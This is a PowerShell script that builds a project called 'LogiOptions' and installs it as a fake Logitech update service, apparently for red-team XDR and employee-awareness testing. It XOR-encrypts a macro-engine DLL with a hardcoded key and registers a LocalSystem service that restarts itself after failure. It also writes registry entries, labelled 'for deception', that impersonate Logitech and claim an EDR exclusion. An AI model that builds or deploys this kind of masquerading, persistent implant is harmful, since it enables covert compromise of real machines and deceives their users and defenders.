# Complete Build and Deployment Script for LogiOptions
# This script builds the project and deploys it as a Windows service in one go
# Run as Administrator for full deployment

param(
    [switch]$BuildOnly,
    [switch]$DeployOnly,
    [switch]$CleanOnly,
    [switch]$TestOnly,
    [string]$ServiceName = "LogitechUpdateService",
    [string]$InstallPath = "C:\Program Files\Logitech\LogiOptions",
    [switch]$Force
)

# ==========================================
# Configuration
# ==========================================
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# Colors for output
$ColorInfo = "Cyan"
$ColorSuccess = "Green"
$ColorWarning = "Yellow"
$ColorError = "Red"
$ColorDetail = "Gray"

# ==========================================
# Functions
# ==========================================

function Write-Header {
    param([string]$Title)
    Write-Host "`n" + ("=" * 50) -ForegroundColor $ColorInfo
    Write-Host $Title -ForegroundColor $ColorInfo
    Write-Host ("=" * 50) -ForegroundColor $ColorInfo
}

function Write-Step {
    param([string]$Message, [string]$Status = "info")
    $color = switch ($Status) {
        "success" { $ColorSuccess }
        "warning" { $ColorWarning }
        "error" { $ColorError }
        default { $ColorInfo }
    }
    Write-Host "  → $Message" -ForegroundColor $color
}

function Write-Detail {
    param([string]$Message)
    Write-Host "    $Message" -ForegroundColor $ColorDetail
}

function Test-Administrator {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Clean-Project {
    Write-Header "Step 1: Cleaning Project"
    
    $foldersToClean = @(
        "bin",
        "obj", 
        "MacroEngine.Core\bin",
        "MacroEngine.Core\obj",
        "MacroEngine.Core.enc"
    )
    
    foreach ($folder in $foldersToClean) {
        if (Test-Path $folder) {
            Remove-Item -Path $folder -Recurse -Force -ErrorAction SilentlyContinue
            Write-Step "Cleaned: $folder" "success"
        }
    }
    
    # Kill any running instances
    $processes = Get-Process -Name "LogiOptions" -ErrorAction SilentlyContinue
    if ($processes) {
        $processes | Stop-Process -Force -ErrorAction SilentlyContinue
        Write-Step "Stopped running LogiOptions processes" "warning"
    }
    
    Write-Step "Clean completed successfully!" "success"
}

function Build-Project {
    Write-Header "Step 2: Building Project"
    
    # Step 2.1: Restore packages
    Write-Step "Restoring NuGet packages..."
    try {
        $restoreResult = dotnet restore
        if ($LASTEXITCODE -ne 0) {
            throw "Restore failed with exit code $LASTEXITCODE"
        }
        Write-Step "Package restore completed" "success"
    } catch {
        Write-Step "Package restore failed: $_" "error"
        throw
    }
    
    # Step 2.2: Build MacroEngine.Core
    Write-Step "Building MacroEngine.Core..."
    try {
        $coreBuild = dotnet build "MacroEngine.Core\MacroEngine.Core.csproj" -c Release -v minimal
        if ($LASTEXITCODE -ne 0) {
            throw "MacroEngine.Core build failed"
        }
        
        # Verify DLL was created
        $dllPath = "MacroEngine.Core\bin\Release\net10.0-windows\MacroEngine.Core.dll"
        if (-not (Test-Path $dllPath)) {
            throw "MacroEngine.Core.dll not found after build"
        }
        
        $dllSize = [math]::Round((Get-Item $dllPath).Length / 1KB, 2)
        Write-Step "MacroEngine.Core built successfully ($dllSize KB)" "success"
    } catch {
        Write-Step "MacroEngine.Core build failed: $_" "error"
        throw
    }
    
    # Step 2.3: Encrypt the DLL
    Write-Step "Encrypting MacroEngine.Core.dll..."
    try {
        # Read the DLL bytes
        $bytes = [System.IO.File]::ReadAllBytes($dllPath)
        
        # XOR encryption key
        $key = [System.Text.Encoding]::UTF8.GetBytes("MacroKey2025!")
        
        # Encrypt the bytes
        for($i = 0; $i -lt $bytes.Length; $i++) {
            $bytes[$i] = $bytes[$i] -bxor $key[$i % $key.Length]
        }
        
        # Save the encrypted file
        [System.IO.File]::WriteAllBytes("MacroEngine.Core.enc", $bytes)
        
        $encSize = [math]::Round((Get-Item "MacroEngine.Core.enc").Length / 1KB, 2)
        Write-Step "Encryption completed ($encSize KB)" "success"
    } catch {
        Write-Step "Encryption failed: $_" "error"
        throw
    }
    
    # Step 2.4: Build main project
    Write-Step "Building main LogiOptions project..."
    try {
        $mainBuild = dotnet build -c Release -v minimal
        if ($LASTEXITCODE -ne 0) {
            throw "Main build failed"
        }
        Write-Step "Main build completed" "success"
    } catch {
        Write-Step "Main build failed: $_" "error"
        throw
    }
    
    # Step 2.5: Verify output
    Write-Step "Verifying build output..."
    $outputDir = "bin\Release\net10.0-windows"
    if (Test-Path $outputDir) {
        $exePath = Join-Path $outputDir "LogiOptions.exe"
        if (Test-Path $exePath) {
            $exeSize = [math]::Round((Get-Item $exePath).Length / 1MB, 2)
            Write-Step "Build successful! Executable: $exePath ($exeSize MB)" "success"
            
            # List all output files
            $files = Get-ChildItem $outputDir
            Write-Detail "Output files:"
            foreach ($file in $files) {
                $size = [math]::Round($file.Length / 1KB, 2)
                Write-Detail "  - $($file.Name) ($size KB)"
            }
        } else {
            throw "Executable not found in output directory"
        }
    } else {
        throw "Output directory not found"
    }
    
    Write-Step "Build process completed successfully!" "success"
}

function Test-Project {
    Write-Header "Step 3: Testing Project"
    
    $outputDir = "bin\Release\net10.0-windows"
    $exePath = Join-Path $outputDir "LogiOptions.exe"
    
    if (-not (Test-Path $exePath)) {
        Write-Step "Executable not found. Build the project first." "error"
        return $false
    }
    
    Write-Step "Testing executable functionality..."
    
    # Test 1: Version check
    try {
        $versionOutput = & $exePath --version 2>&1
        if ($LASTEXITCODE -eq 0) {
            Write-Step "Version test passed: $versionOutput" "success"
        } else {
            Write-Step "Version test failed (exit code: $LASTEXITCODE)" "warning"
        }
    } catch {
        Write-Step "Version test error: $_" "warning"
    }
    
    # Test 2: Help check
    try {
        $helpOutput = & $exePath --help 2>&1 | Select-Object -First 5
        if ($LASTEXITCODE -eq 0) {
            Write-Step "Help test passed" "success"
        } else {
            Write-Step "Help test failed" "warning"
        }
    } catch {
        Write-Step "Help test error: $_" "warning"
    }
    
    # Test 3: Debug purpose check
    try {
        $debugOutput = & $exePath --debug-purpose 2>&1 | Select-Object -First 3
        if ($LASTEXITCODE -eq 0) {
            Write-Step "Debug purpose test passed" "success"
        } else {
            Write-Step "Debug purpose test failed" "warning"
        }
    } catch {
        Write-Step "Debug purpose test error: $_" "warning"
    }
    
    Write-Step "Testing completed (some warnings may be expected)" "success"
    return $true
}

function Deploy-Service {
    Write-Header "Step 4: Deploying Service"
    
    # Check if running as Administrator
    if (-not (Test-Administrator)) {
        Write-Step "ERROR: Deployment requires Administrator privileges!" "error"
        Write-Step "Please run PowerShell as Administrator and try again." "warning"
        throw "Administrator privileges required"
    }
    
    $outputDir = "bin\Release\net10.0-windows"
    $exePath = Join-Path $outputDir "LogiOptions.exe"
    
    if (-not (Test-Path $exePath)) {
        Write-Step "Executable not found. Build the project first." "error"
        throw "Executable not found"
    }
    
    # Step 4.1: Create installation directory
    Write-Step "Creating installation directory: $InstallPath"
    try {
        if (Test-Path $InstallPath) {
            if ($Force) {
                Remove-Item -Path $InstallPath -Recurse -Force -ErrorAction SilentlyContinue
                Write-Step "Removed existing installation directory" "warning"
            } else {
                Write-Step "Installation directory already exists. Use -Force to overwrite." "warning"
                return $false
            }
        }
        
        New-Item -ItemType Directory -Path $InstallPath -Force | Out-Null
        Write-Step "Installation directory created" "success"
    } catch {
        Write-Step "Failed to create installation directory: $_" "error"
        throw
    }
    
    # Step 4.2: Copy files
    Write-Step "Copying files to installation directory..."
    try {
        # Copy main executable
        Copy-Item $exePath $InstallPath -Force
        Write-Detail "Copied: LogiOptions.exe"
        
        # Copy supporting files
        $supportFiles = @(
            "appsettings.json",
            "test_scenario.json", 
            "whitelist.sig",
            "LogiOptions.exe.sig",
            "LogiOptions.chm"
        )
        
        foreach ($file in $supportFiles) {
            if (Test-Path $file) {
                Copy-Item $file $InstallPath -Force
                Write-Detail "Copied: $file"
            } else {
                Write-Detail "Warning: $file not found"
            }
        }
        
        Write-Step "Files copied successfully" "success"
    } catch {
        Write-Step "File copy failed: $_" "error"
        throw
    }
    
    # Step 4.3: Create registry artifacts
    Write-Step "Creating registry artifacts for deception..."
    try {
        # Main registry path
        $regPath = "HKLM:\SOFTWARE\Logitech\Options"
        New-Item -Path $regPath -Force | Out-Null
        New-ItemProperty -Path $regPath -Name "Version" -Value "10.5.2" -PropertyType String -Force | Out-Null
        New-ItemProperty -Path $regPath -Name "InstallPath" -Value $InstallPath -PropertyType String -Force | Out-Null
        New-ItemProperty -Path $regPath -Name "AnalyticsEnabled" -Value 1 -PropertyType DWord -Force | Out-Null
        New-ItemProperty -Path $regPath -Name "UpdateCheckInterval" -Value 86400 -PropertyType DWord -Force | Out-Null
        New-ItemProperty -Path $regPath -Name "Publisher" -Value "Accessibility Tools Foundation" -PropertyType String -Force | Out-Null
        
        # Test scenario registry
        $testRegPath = "HKLM:\SOFTWARE\Logitech\Options\TestScenario"
        New-Item -Path $testRegPath -Force | Out-Null
        New-ItemProperty -Path $testRegPath -Name "Enabled" -Value 1 -PropertyType DWord -Force | Out-Null
        New-ItemProperty -Path $testRegPath -Name "InjectedInput" -Value "true (required for UI automation)" -PropertyType String -Force | Out-Null
        
        # Whitelist registry
        $whitelistRegPath = "HKLM:\SOFTWARE\Logitech\Options\Whitelist"
        New-Item -Path $whitelistRegPath -Force | Out-Null
        New-ItemProperty -Path $whitelistRegPath -Name "EDR" -Value "Excluded via corporate policy" -PropertyType String -Force | Out-Null
        
        Write-Step "Registry artifacts created successfully" "success"
    } catch {
        Write-Step "Registry creation failed: $_" "error"
        throw
    }
    
    # Step 4.4: Install Windows service
    Write-Step "Installing Windows service: $ServiceName"
    try {
        # Check if service already exists
        $existingService = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
        if ($existingService) {
            Write-Step "Service already exists. Stopping and removing..." "warning"
            Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 2
            sc.exe delete $ServiceName 2>$null | Out-Null
            Start-Sleep -Seconds 2
        }
        
        # Create new service
        $destinationExe = Join-Path $InstallPath "LogiOptions.exe"
        $scResult = sc.exe create $ServiceName binPath= "`"$destinationExe`" --service" DisplayName= "Logitech Update Service (On-Demand)" start= demand obj= "LocalSystem" 2>&1
        
        if ($LASTEXITCODE -ne 0) {
            throw "Service creation failed. SC output: $scResult"
        }
        
        # Set service description
        sc.exe description $ServiceName "Provides UI automation test support and peripheral synchronization." 2>$null | Out-Null
        
        # Configure service recovery
        sc.exe failure $ServiceName reset= 86400 actions= "restart/5000/restart/5000/restart/5000" 2>$null | Out-Null
        
        Write-Step "Windows service installed successfully" "success"
    } catch {
        Write-Step "Service installation failed: $_" "error"
        throw
    }
    
    # Step 4.5: Verify installation
    Write-Step "Verifying service installation..."
    try {
        $service = Get-Service -Name $ServiceName -ErrorAction Stop
        Write-Detail "Service Name: $($service.Name)"
        Write-Detail "Display Name: $($service.DisplayName)"
        Write-Detail "Status: $($service.Status)"
        Write-Detail "Start Type: $($service.StartType)"
        
        # Check executable path
        $scQuery = sc.exe qc $ServiceName 2>$null
        $binPath = ($scQuery | Select-String "BINARY_PATH_NAME").ToString().Split(':')[1].Trim()
        Write-Detail "Executable Path: $binPath"
        
        Write-Step "Service verification completed successfully" "success"
    } catch {
        Write-Step "Service verification failed: $_" "warning"
    }
    
    Write-Step "Deployment completed successfully!" "success"
    return $true
}

function Show-Summary {
    Write-Header "Deployment Summary"
    
    $outputDir = "bin\Release\net10.0-windows"
    $exePath = Join-Path $outputDir "LogiOptions.exe"
    
    if (Test-Path $exePath) {
        Write-Step "✅ Build Output:" "success"
        Write-Detail "Location: $exePath"
        
        if (Test-Path $InstallPath) {
            Write-Step "✅ Service Installation:" "success"
            Write-Detail "Service Name: $ServiceName"
            Write-Detail "Install Path: $InstallPath"
            
            $service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
            if ($service) {
                Write-Detail "Service Status: $($service.Status)"
            }
        }
    }
    
    Write-Step "📋 Next Steps for XDR Testing:" "info"
    Write-Detail "1. Monitor XDR alerts for detection of '$ServiceName'"
    Write-Detail "2. Check if employees question the 'Logitech update'"
    Write-Detail "3. Test persistence across system reboots"
    Write-Detail "4. Document findings for security awareness training"
    
    Write-Step "🔧 Management Commands:" "info"
    Write-Detail "Start service: Start-Service -Name '$ServiceName'"
    Write-Detail "Stop service: Stop-Service -Name '$ServiceName' -Force"
    Write-Detail "Check status: Get-Service -Name '$ServiceName'"
    Write-Detail "Uninstall: .\CompleteBuildAndDeploy.ps1 -CleanOnly"
}

# ==========================================
# Main Execution
# ==========================================

Write-Host "`n" + ("#" * 60) -ForegroundColor $ColorInfo
Write-Host "LOGIOPTIONS COMPLETE BUILD & DEPLOYMENT TOOL" -ForegroundColor $ColorInfo
Write-Host ("#" * 60) -ForegroundColor $ColorInfo
Write-Host "Purpose: Build project and deploy as Windows service for XDR testing" -ForegroundColor $ColorDetail
Write-Host "Service Name: $ServiceName" -ForegroundColor $ColorDetail
Write-Host "Install Path: $InstallPath" -ForegroundColor $ColorDetail
Write-Host "`n"

try {
    # Determine what to do based on parameters
    if ($CleanOnly) {
        Clean-Project
        exit 0
    }
    
    if ($BuildOnly) {
        Clean-Project
        Build-Project
        Test-Project
        exit 0
    }
    
    if ($DeployOnly) {
        Deploy-Service
        Show-Summary
        exit 0
    }
    
    if ($TestOnly) {
        Test-Project
        exit 0
    }
    
    # Full process (default)
    Write-Host "Starting complete build and deployment process..." -ForegroundColor $ColorInfo
    Write-Host "This will: Clean → Build → Test → Deploy as Windows Service" -ForegroundColor $ColorDetail
    
    # Ask for confirmation if not forced
    if (-not $Force) {
        $confirmation = Read-Host "`nProceed with full build and deployment? (y/n)"
        if ($confirmation -ne 'y') {
            Write-Host "Operation cancelled by user." -ForegroundColor $ColorWarning
            exit 0
        }
    }
    
    # Execute full process
    Clean-Project
    Build-Project
    Test-Project
    Deploy-Service
    Show-Summary
    
    Write-Host "`n" + ("✅" * 30) -ForegroundColor $ColorSuccess
    Write-Host "COMPLETE PROCESS FINISHED SUCCESSFULLY!" -ForegroundColor $ColorSuccess
    Write-Host ("✅" * 30) -ForegroundColor $ColorSuccess
    
} catch {
    Write-Host "`n" + ("❌" * 30) -ForegroundColor $ColorError
    Write-Host "PROCESS FAILED: $($_.Exception.Message)" -ForegroundColor $ColorError
    Write-Host ("❌" * 30) -ForegroundColor $ColorError
    Write-Host "Error details: $_" -ForegroundColor $ColorDetail
    exit 1
}

# ==========================================
# Usage Examples
# ==========================================
<#
.SYNOPSIS
Complete build and deployment script for LogiOptions project.

.DESCRIPTION
This script builds the LogiOptions project and deploys it as a Windows service
named 'LogitechUpdateService' for XDR testing and employee awareness testing.

.PARAMETER BuildOnly
Only build the project without deploying.

.PARAMETER DeployOnly
Only deploy the service (requires existing build).

.PARAMETER CleanOnly
Only clean the project (remove bin/obj folders).

.PARAMETER TestOnly
Only test the built executable.

.PARAMETER ServiceName
Name of the Windows service (default: LogitechUpdateService).

.PARAMETER InstallPath
Installation directory (default: C:\Program Files\Logitech\LogiOptions).

.PARAMETER Force
Skip confirmation prompts and force overwrite.

.EXAMPLE
# Full build and deployment (requires Administrator)
.\CompleteBuildAndDeploy.ps1

.EXAMPLE
# Build only (no Administrator required)
.\CompleteBuildAndDeploy.ps1 -BuildOnly

.EXAMPLE
# Deploy only (requires Administrator and existing build)
.\CompleteBuildAndDeploy.ps1 -DeployOnly

.EXAMPLE
# Clean project only
.\CompleteBuildAndDeploy.ps1 -CleanOnly

.EXAMPLE
# Force deployment without confirmation
.\CompleteBuildAndDeploy.ps1 -Force
#>